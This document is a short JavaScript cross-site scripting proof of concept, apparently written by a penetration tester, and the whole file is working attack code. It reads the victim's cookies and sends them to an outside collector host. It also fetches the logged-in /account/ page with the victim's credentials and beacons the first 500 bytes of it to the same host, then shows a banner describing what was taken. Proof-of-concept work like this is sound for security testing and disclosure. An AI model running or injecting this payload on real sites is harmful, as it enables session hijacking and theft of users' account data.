(function(){
var C='https://vinothpentest.free.beeceptor.com/data?pii='
var ck=document.cookie;
new Image().src=C+'c.gif?host='+encodeURIComponent(location.hostname)+'&cookies='+encodeURIComponent(ck);
function P(t){var o=document.getElementById('xsspoc')||document.createElement('div');o.id='xsspoc';
o.style.cssText='position:fixed;top:0;left:0;width:100%;z-index:2147483647;background:#b00020;color:#fff;font:12px/1.5 monospace;padding:10px;white-space:pre-wrap';
o.textContent=t;document.documentElement.appendChild(o);}
var M='XSS PoC running...';P(M);setInterval(function(){P(M)},700);
fetch('/account/',{credentials:'include'}).then(function(r){return r.text().then(function(t){
navigator.sendBeacon(C+'d.txt','host='+location.hostname+'&url=/account/&status='+r.status+'&len='+t.length+'&head='+encodeURIComponent(t.slice(0,500)));
M='XSS PoC - script executed in origin '+document.domain
+'\nCookies read + exfiltrated: '+ck.length+' bytes -> vinothpentest.free.beeceptor.com'
+'\nSame-origin credentialed read of /account/: HTTP '+r.status+' ('+t.length+' bytes) -> exfiltrated to vinothpentest.free.beeceptor.com';
})});
})();
